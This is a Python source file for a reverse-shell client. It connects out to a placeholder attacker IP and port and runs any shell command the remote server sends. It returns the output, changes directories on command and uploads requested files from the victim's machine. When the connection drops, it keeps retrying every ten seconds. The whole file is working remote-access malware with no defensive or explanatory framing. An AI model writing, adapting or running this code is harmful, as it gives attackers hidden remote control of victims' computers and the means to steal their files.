import socket
import subprocess
import os
import sys
import time

IP = "XXX.XXX.XXX.XXX" #Public ip
PORT = 12345
BUFFER_SIZE = 4096
HEADERSIZE = 10

def getPacket(conn):
	msg = conn.recv(BUFFER_SIZE).decode("utf-8") #we recv from source
	if not msg: #if the source did not response that means it closed the connection so we return None
		return None
	msgLen = int(msg[:HEADERSIZE]) #we take data len from header (i.e. "50        dir"[HEADERSIZE:] will give us everything until HEADERSIZE without HEADERSIZE POS)
	while (len(msg)-HEADERSIZE) < msgLen: #While msg is smaller than what we expect we are recv and append to msg string
		msg += conn.recv(BUFFER_SIZE).decode("utf-8")
	return msg[HEADERSIZE:] #Return the data without the header

def sendPath(conn, flag, msg=None):
	"""Could be implemented way better (review later)"""
	if flag == 1: #it means that we want to change directory to target machine
		os.chdir(msg)
	msg = os.getcwd() #get cwd
	msg_len = f"{len(msg):<{HEADERSIZE}}" #fstring using :< operator for fstrings storing len(msg) and HEADERSIZE (will fill with spaces to the left)
	msg = msg_len + msg
	conn.send(msg.encode("utf-8")) #send to Destination PORT the changed path

def sendInfo(conn, cmd):
	cmd = subprocess.run(cmd, shell=True, capture_output=True) 
	#shell true so we can execute inside shell / capture_output to store to process stdout attribute the outcome of the command
	try:
		packet = cmd.stdout.decode("utf-8")#decoded output
		packetLen = len(packet)
		packet = f"{packetLen:<{HEADERSIZE}}" + packet
		conn.send(packet.encode("utf-8"))
	except:
		conn.send(b"0         ")

def sendFile(conn, fname):
	foundFile = False
	for file in os.listdir():
		if file == fname:
			foundFile = True
	if foundFile:
		with open(fname, "rb") as f:
			dataLen = os.path.getsize(fname)
			length = f"{dataLen:<{HEADERSIZE}}"
			conn.send(length.encode("utf-8"))
			total_sent = 0
			while total_sent < dataLen:
				chunk = f.read(BUFFER_SIZE)
				if chunk:
					sent = conn.send(chunk)
					total_sent += sent
				else:
					print("end of op")
					break

def connect():
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	terminate = "exit"
	client.connect((IP, PORT))
	sendPath(client, 0)

	while True:
		msg = getPacket(client)

		if not msg: continue
		elif msg == terminate:
			client.close()
			client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			print("Connection closed from Destination. . .")
			while not (reconnected:= False): 
				try:
					print("Trying to reconnect. . .")
					client.connect((IP, PORT))
					sendPath(client, 0)
					print("[+] Successfully connected with Server!")
					reconnected = True
					break
				except:
					time.sleep(10)
					continue
			continue
		elif msg[:2] == "cd":
			sendPath(client, 1, msg[3:])
		elif msg[:3] == "get":
			sendFile(client, msg[4:])
		else:
			sendInfo(client, msg)

if __name__ == '__main__':
	while True:
		try:
			connect()
		except Exception as e:
			print(e)
